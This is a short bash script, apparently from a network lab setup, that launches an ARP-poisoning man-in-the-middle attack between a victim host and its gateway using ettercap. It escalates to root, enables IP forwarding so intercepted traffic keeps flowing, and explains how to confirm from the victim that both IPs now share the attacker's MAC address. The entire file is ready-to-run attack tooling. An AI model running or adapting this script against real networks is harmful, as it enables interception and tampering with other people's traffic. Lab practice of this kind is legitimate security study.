#!/usr/bin/env bash
# Start ARP poisoning against VICTIM_IP and GATEWAY_IP via ettercap.
set -euo pipefail
source "$(dirname "$0")/lab.env"

if [[ $EUID -ne 0 ]]; then
  exec sudo -E "$0" "$@"
fi

echo "[*] Enabling IPv4 forwarding..."
echo 1 > /proc/sys/net/ipv4/ip_forward

echo "[*] Poisoning:"
echo "    iface   = $IFACE"
echo "    victim  = $VICTIM_IP"
echo "    gateway = $GATEWAY_IP"
echo
echo "[i] Ctrl-C to stop. Ettercap will keep replaying replies until then."
echo "[i] To confirm from the victim: arp -a  (both IPs should now share the attacker MAC)"
echo

exec ettercap -T -i "$IFACE" -M arp:remote \
  "/$VICTIM_IP//" "/$GATEWAY_IP//"
